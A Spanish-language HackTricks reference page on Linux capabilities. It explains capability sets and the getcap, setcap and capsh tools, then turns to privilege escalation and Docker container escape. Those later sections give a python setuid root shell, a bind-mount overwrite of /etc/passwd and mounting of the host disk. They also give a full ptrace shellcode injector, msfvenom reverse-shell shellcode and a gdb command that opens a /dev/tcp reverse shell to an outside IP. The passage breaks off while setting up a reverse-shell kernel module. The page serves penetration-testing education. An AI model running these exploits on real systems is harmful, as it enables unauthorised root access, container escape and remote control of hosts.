# Capacidades de Linux

<details>

<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro crucial para profesionales de tecnología y ciberseguridad en todas las disciplinas.\\

{% embed url="https://www.rootedcon.com/" %}

## Capacidades de Linux

Las capacidades de Linux dividen los **privilegios de root en unidades más pequeñas y distintas**, permitiendo que los procesos tengan un subconjunto de privilegios. Esto minimiza los riesgos al no otorgar privilegios completos de root innecesariamente.

### El Problema:
- Los usuarios normales tienen permisos limitados, lo que afecta tareas como abrir un socket de red que requiere acceso de root.

### Conjuntos de Capacidades:

1. **Heredadas (CapInh)**:
- **Propósito**: Determina las capacidades heredadas del proceso padre.
- **Funcionalidad**: Cuando se crea un nuevo proceso, hereda las capacidades de su padre en este conjunto. Útil para mantener ciertos privilegios en los procesos generados.
- **Restricciones**: Un proceso no puede adquirir capacidades que su padre no poseía.

2. **Efectivas (CapEff)**:
- **Propósito**: Representa las capacidades reales que un proceso está utilizando en cualquier momento.
- **Funcionalidad**: Es el conjunto de capacidades verificado por el kernel para otorgar permiso para varias operaciones. Para archivos, este conjunto puede ser una bandera que indique si las capacidades permitidas del archivo deben considerarse efectivas.
- **Importancia**: El conjunto efectivo es crucial para verificaciones inmediatas de privilegios, actuando como el conjunto activo de capacidades que un proceso puede utilizar.

3. **Permitidas (CapPrm)**:
- **Propósito**: Define el conjunto máximo de capacidades que un proceso puede poseer.
- **Funcionalidad**: Un proceso puede elevar una capacidad del conjunto permitido a su conjunto efectivo, dándole la capacidad de utilizar esa capacidad. También puede eliminar capacidades de su conjunto permitido.
- **Límite**: Actúa como un límite superior para las capacidades que un proceso puede tener, asegurando que un proceso no exceda su alcance de privilegios predefinido.

4. **Limitantes (CapBnd)**:
- **Propósito**: Establece un límite en las capacidades que un proceso puede adquirir en cualquier momento durante su ciclo de vida.
- **Funcionalidad**: Incluso si un proceso tiene cierta capacidad en su conjunto heredable o permitido, no puede adquirir esa capacidad a menos que también esté en el conjunto limitante.
- **Casos de uso**: Este conjunto es particularmente útil para restringir el potencial de escalada de privilegios de un proceso, agregando una capa adicional de seguridad.

5. **Ambientales (CapAmb)**:
- **Propósito**: Permite que ciertas capacidades se mantengan a través de una llamada al sistema `execve`, que normalmente resultaría en un restablecimiento completo de las capacidades del proceso.
- **Funcionalidad**: Asegura que los programas no SUID que no tienen capacidades de archivo asociadas puedan retener ciertos privilegios.
- **Restricciones**: Las capacidades en este conjunto están sujetas a las restricciones de los conjuntos heredables y permitidos, asegurando que no excedan los privilegios permitidos del proceso.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Para obtener más información, consulta:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacidades de Procesos y Binarios

### Capacidades de Procesos

Para ver las capacidades de un proceso en particular, utiliza el archivo **status** en el directorio /proc. Dado que proporciona más detalles, limítalo solo a la información relacionada con las capacidades de Linux.\
Ten en cuenta que para todos los procesos en ejecución, la información de las capacidades se mantiene por hilo, y para los binarios en el sistema de archivos se almacena en atributos extendidos.

Puedes encontrar las capacidades definidas en /usr/include/linux/capability.h

Puedes encontrar las capacidades del proceso actual en `cat /proc/self/status` o haciendo `capsh --print`, y las de otros usuarios en `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando debería devolver 5 líneas en la mayoría de los sistemas.

* CapInh = Capacidades heredadas
* CapPrm = Capacidades permitidas
* CapEff = Capacidades efectivas
* CapBnd = Conjunto de límites
* CapAmb = Conjunto de capacidades ambientales
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Estos números hexadecimales no tienen sentido. Usando la utilidad capsh podemos decodificarlos en el nombre de las capacidades.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Veamos ahora las **capacidades** utilizadas por `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Aunque eso funciona, hay otra forma más fácil. Para ver las capacidades de un proceso en ejecución, simplemente usa la herramienta **getpcaps** seguida de su ID de proceso (PID). También puedes proporcionar una lista de IDs de procesos.
```bash
getpcaps 1234
```
Vamos a verificar aquí las capacidades de `tcpdump` después de haber otorgado al binario suficientes capacidades (`cap_net_admin` y `cap_net_raw`) para husmear la red (_tcpdump se está ejecutando en el proceso 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como puedes ver, las capacidades proporcionadas corresponden con los resultados de las 2 formas de obtener las capacidades de un binario.\
La herramienta _getpcaps_ utiliza la llamada al sistema **capget()** para consultar las capacidades disponibles para un hilo en particular. Esta llamada al sistema solo necesita proporcionar el PID para obtener más información.

### Capacidades de Binarios

Los binarios pueden tener capacidades que se pueden utilizar durante la ejecución. Por ejemplo, es muy común encontrar el binario `ping` con la capacidad `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puedes **buscar binarios con capacidades** usando:
```bash
getcap -r / 2>/dev/null
```
### Eliminación de capacidades con capsh

Si eliminamos las capacidades CAP\_NET\_RAW para _ping_, entonces la utilidad de ping ya no debería funcionar.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Además de la salida de _capsh_ en sí, el comando _tcpdump_ también debería mostrar un error.

> /bin/bash: /usr/sbin/tcpdump: Operación no permitida

El error muestra claramente que el comando ping no tiene permiso para abrir un socket ICMP. Ahora sabemos con certeza que esto funciona como se espera.

### Eliminar capacidades

Puedes eliminar las capacidades de un binario con
```bash
setcap -r </path/to/binary>
```
## Capacidades de Usuario

Aparentemente **también es posible asignar capacidades a los usuarios**. Esto probablemente significa que cada proceso ejecutado por el usuario podrá utilizar las capacidades del usuario.\
Basado en [esto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [esto](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) y [esto](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user) algunos archivos nuevos deben ser configurados para dar a un usuario ciertas capacidades, pero el que asigna las capacidades a cada usuario será `/etc/security/capability.conf`.\
Ejemplo de archivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacidades del Entorno

Compilando el siguiente programa es posible **iniciar un shell de bash dentro de un entorno que proporciona capacidades**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro del **bash ejecutado por el binario de ambiente compilado** es posible observar las **nuevas capacidades** (un usuario regular no tendrá ninguna capacidad en la sección "actual").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Solo puedes **añadir capacidades que estén presentes** tanto en los conjuntos permitidos como en los heredados.
{% endhint %}

### Binarios Conscientes de Capacidades/Binarios Tontos de Capacidades

Los **binarios conscientes de capacidades no utilizarán las nuevas capacidades** proporcionadas por el entorno, mientras que los **binarios tontos de capacidades las utilizarán** ya que no las rechazarán. Esto hace que los binarios tontos de capacidades sean vulnerables dentro de un entorno especial que otorga capacidades a los binarios.

## Capacidades de Servicio

Por defecto, un **servicio que se ejecuta como root tendrá asignadas todas las capacidades**, y en algunas ocasiones esto puede ser peligroso.\
Por lo tanto, un archivo de **configuración del servicio** permite **especificar** las **capacidades** que deseas que tenga, **y** el **usuario** que debería ejecutar el servicio para evitar ejecutar un servicio con privilegios innecesarios:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacidades en Contenedores de Docker

Por defecto, Docker asigna algunas capacidades a los contenedores. Es muy fácil verificar cuáles son estas ejecutando:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro clave para profesionales de tecnología y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Escape de Contenedor

Las capacidades son útiles cuando **deseas restringir tus propios procesos después de realizar operaciones con privilegios** (por ejemplo, después de configurar chroot y enlazar a un socket). Sin embargo, pueden ser explotadas al pasarles comandos o argumentos maliciosos que luego se ejecutan como root.

Puedes forzar capacidades en programas usando `setcap` y consultarlas usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
El `+ep` significa que estás añadiendo la capacidad ("-" la eliminaría) como Efectiva y Permitida.

Para identificar programas en un sistema o carpeta con capacidades:
```bash
getcap -r / 2>/dev/null
```
### Ejemplo de explotación

En el siguiente ejemplo se encuentra que el binario `/usr/bin/python2.6` es vulnerable a la escalada de privilegios:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacidades** necesarias por `tcpdump` para **permitir a cualquier usuario capturar paquetes**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### El caso especial de las capacidades "vacías"

[De la documentación](https://man7.org/linux/man-pages/man7/capabilities.7.html): Tenga en cuenta que se pueden asignar conjuntos de capacidades vacíos a un archivo de programa, por lo que es posible crear un programa con identificación de usuario establecida en root que cambie la identificación de usuario efectiva y guardada del proceso que ejecuta el programa a 0, pero no confiere capacidades a ese proceso. O, dicho de forma simple, si tiene un binario que:

1. no es propiedad de root
2. no tiene los bits `SUID`/`SGID` establecidos
3. tiene un conjunto de capacidades vacío (por ejemplo: `getcap myelf` devuelve `myelf =ep`)

entonces **ese binario se ejecutará como root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** es una capacidad de Linux altamente potente, a menudo equiparada a un nivel casi de root debido a sus extensos **privilegios administrativos**, como montar dispositivos o manipular características del kernel. Si bien es indispensable para contenedores que simulan sistemas completos, **`CAP_SYS_ADMIN` plantea desafíos de seguridad significativos**, especialmente en entornos contenerizados, debido a su potencial para la escalada de privilegios y compromiso del sistema. Por lo tanto, su uso requiere evaluaciones de seguridad rigurosas y una gestión cautelosa, con una fuerte preferencia por eliminar esta capacidad en contenedores específicos de aplicaciones para cumplir con el **principio de menor privilegio** y minimizar la superficie de ataque.

**Ejemplo con binario**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando python puedes montar un archivo _passwd_ modificado sobre el verdadero archivo _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Y finalmente **monta** el archivo `passwd` modificado en `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Y podrás **`su` como root** usando la contraseña "password".

**Ejemplo con entorno (Escape de Docker)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior se puede ver que la capacidad SYS\_ADMIN está habilitada.

* **Montaje**

Esto permite al contenedor de docker **montar el disco del host y acceder a él libremente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Acceso completo**

En el método anterior logramos acceder al disco del host de Docker.\
En caso de que descubras que el host está ejecutando un servidor **ssh**, podrías **crear un usuario dentro del disco del host de Docker** y acceder a él a través de SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Esto significa que puedes escapar del contenedor inyectando un shellcode dentro de algún proceso en ejecución dentro del host.** Para acceder a los procesos en ejecución dentro del host, el contenedor debe ejecutarse al menos con **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** otorga la capacidad de utilizar funcionalidades de depuración y rastreo de llamadas al sistema proporcionadas por `ptrace(2)` y llamadas de adjuntar memoria cruzada como `process_vm_readv(2)` y `process_vm_writev(2)`. Aunque es poderoso para fines de diagnóstico y monitoreo, si `CAP_SYS_PTRACE` está habilitado sin medidas restrictivas como un filtro seccomp en `ptrace(2)`, puede socavar significativamente la seguridad del sistema. Específicamente, puede ser explotado para eludir otras restricciones de seguridad, especialmente aquellas impuestas por seccomp, como se demuestra en [pruebas de concepto (PoC) como esta](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Ejemplo con binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Ejemplo con binario (gdb)**

`gdb` con la capacidad `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Crear un shellcode con msfvenom para inyectar en memoria a través de gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depurar un proceso raíz con gdb y copiar y pegar las líneas de gdb previamente generadas:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Ejemplo con entorno (fuga de Docker) - Otro abuso de gdb**

Si **GDB** está instalado (o puedes instalarlo con `apk add gdb` o `apt install gdb`, por ejemplo) puedes **depurar un proceso desde el host** y hacer que llame a la función `system`. (Esta técnica también requiere la capacidad `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
No podrás ver la salida del comando ejecutado, pero será ejecutado por ese proceso (así obtendrás un shell inverso).

{% hint style="warning" %}
Si obtienes el error "No symbol "system" in current context.", verifica el ejemplo anterior cargando un shellcode en un programa a través de gdb.
{% endhint %}

**Ejemplo con entorno (Escape de Docker) - Inyección de Shellcode**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** capacita a un proceso para **cargar y descargar módulos del kernel (llamadas al sistema `init_module(2)`, `finit_module(2)` y `delete_module(2)`)**, ofreciendo acceso directo a las operaciones fundamentales del kernel. Esta capacidad presenta riesgos críticos de seguridad, ya que permite la escalada de privilegios y la compromisión total del sistema al permitir modificaciones en el kernel, evitando así todos los mecanismos de seguridad de Linux, incluidos los Módulos de Seguridad de Linux y el aislamiento de contenedores.
**Esto significa que puedes** **insertar/eliminar módulos del kernel en/del kernel de la máquina anfitriona.**

**Ejemplo con binario**

En el siguiente ejemplo, el binario **`python`** tiene esta capacidad.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Por defecto, el comando **`modprobe`** verifica la lista de dependencias y los archivos de mapeo en el directorio **`/lib/modules/$(uname -r)`**.\
Para abusar de esto, creemos una carpeta falsa **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Luego **compila el módulo del kernel que puedes encontrar 2 ejemplos a continuación y copia**lo en esta carpeta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
